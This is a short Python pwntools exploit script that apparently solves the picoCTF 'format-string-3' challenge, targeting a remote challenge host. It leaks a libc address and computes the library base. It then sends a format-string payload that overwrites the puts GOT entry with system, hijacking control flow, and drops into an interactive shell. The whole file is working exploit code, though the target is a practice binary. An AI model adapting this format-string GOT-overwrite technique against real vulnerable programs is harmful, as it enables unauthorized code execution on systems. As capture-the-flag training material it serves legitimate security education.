from pwn import *

exe = ELF('./format-string-3')
libc = ELF('./libc.so.6')
context.binary = exe.path

# io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("rhea.picoctf.net", "51446")

io.recvuntil(b'libc:')
setvbuf_address = int(io.recvline(), 16)
libc.address = setvbuf_address - libc.sym.setvbuf 
print(f'{hex(libc.sym.system) = }')
print(f'{hex(libc.sym.puts) = }')
print(f'{hex(exe.got.puts) = }')

# 0x7fdef560f963-0xfbad208b-0x7ffe1d1cd880-0x1-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)- (nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x252d70252d702520

writes = {exe.got.puts: libc.sym.system}
offset = 38
payload = fmtstr_payload(offset, writes)
io.sendline(payload)

io.interactive()
